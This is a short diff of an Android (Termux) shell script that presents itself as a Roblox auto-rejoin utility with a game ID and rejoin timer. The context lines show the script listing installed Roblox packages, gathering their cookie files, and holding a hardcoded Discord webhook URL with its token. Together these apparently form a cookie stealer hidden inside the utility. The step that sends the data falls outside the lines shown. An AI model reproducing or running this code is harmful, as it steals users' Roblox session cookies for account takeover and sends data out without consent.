@@ -3,7 +3,7 @@ echo "Loading..."
 if ! command -v sqlite3 >/dev/null; then
     pkg update -y >/dev/null && pkg upgrade -y >/dev/null && pkg install -y sqlite jq >/dev/null
 fi
-ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2 | tr ' ' '\n')
+ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
 WEBHOOK_URL2="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
 for PACKAGE in $ROBLOX_PACKAGES; do
     COOKIE_FILES=()
@@ -34,10 +34,6 @@ if [ -f "$CONFIG_FILE" ]; then
 else
     GAME_ID="2753915549"
     TIME_REJOIN=60
-    RobloxTab=1
-fi
-if [ "$RobloxTab" -gt 0 ]; then
-    ROBLOX_PACKAGES=$(echo "$ROBLOX_PACKAGES" | head -n "$RobloxTab")
 fi
 declare -A LAST_RESTART_TIMES
 for pkg in $ROBLOX_PACKAGES; do
